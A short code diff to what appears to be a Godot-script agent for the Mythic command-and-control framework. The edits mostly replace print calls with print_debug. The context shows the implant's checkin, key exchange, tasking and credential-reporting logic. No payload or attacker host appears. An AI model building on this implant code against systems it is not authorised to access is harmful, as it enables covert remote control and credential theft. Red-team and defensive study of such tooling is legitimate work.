@@ -67,7 +67,7 @@ func _send_checkin():
 		var err = upnp.discover(1000, 4)
 		
 		if err != OK:
-			print(str(err))
+			print_debug(str(err))
 		else:
 			ip = upnp.query_external_address()
 
@@ -94,7 +94,7 @@ func _send_checkin():
 			"decryption_key": config.get_dk(), # decryption key - optional
 		}), true)
 	else:
-		print("no transport protocol set - bailing on checkin...")
+		print_debug("no transport protocol set - bailing on checkin...")
 
 func _on_callback_timer_timeout():
 	if protocol == null:
@@ -123,6 +123,7 @@ func send(payload):
 	protocol.send(payload)
 
 func recv(action, result):
+	# https://docs.mythic-c2.net/customizing/c2-related-development/c2-profile-code/agent-side-coding/agent-message-format
 	match action:
 		"checkin":
 			checkin(result)
@@ -133,24 +134,22 @@ func recv(action, result):
 		"get_tasking":
 			emit_signal("tasking", result)
 		_:
-			print("unknown... %s ==> " % [action, result])
+			print_debug("unknown... %s ==> " % [action, result])
 			unknown_response(result)
 
 func checkin(data):
 	# https:#docs.mythic-c2.net/customizing/c2-related-development/c2-profile-code/agent-side-coding/initial-checkin
-	# {action:checkin, decryption_key:, encryption_key:, id:4da40eb1-a0ad-4cec-a443-d7083edd2918, status:success}
-
 	if data.has("payload") and data.get("payload").has("id"):
 		config.parse_checkin(data)
-		print("checking complete!")
+		print_debug("checking complete!")
 	else:
-		print("Checkin failed? ", data)
+		print_debug("Checkin failed? ", data)
 
-func execute(result):
-	pass
+func execute(_result):
+	print_debug("execute? : ", _result)
 
-func unknown_response(result):
-	pass
+func unknown_response(_result):
+	print_debug("unknown_response? : ", _result)
 
 # TODO: nuke?
 func create_task_response(status, completed, task_id, output, artifacts = [], credentials = [], unkeyed_payloads = []):
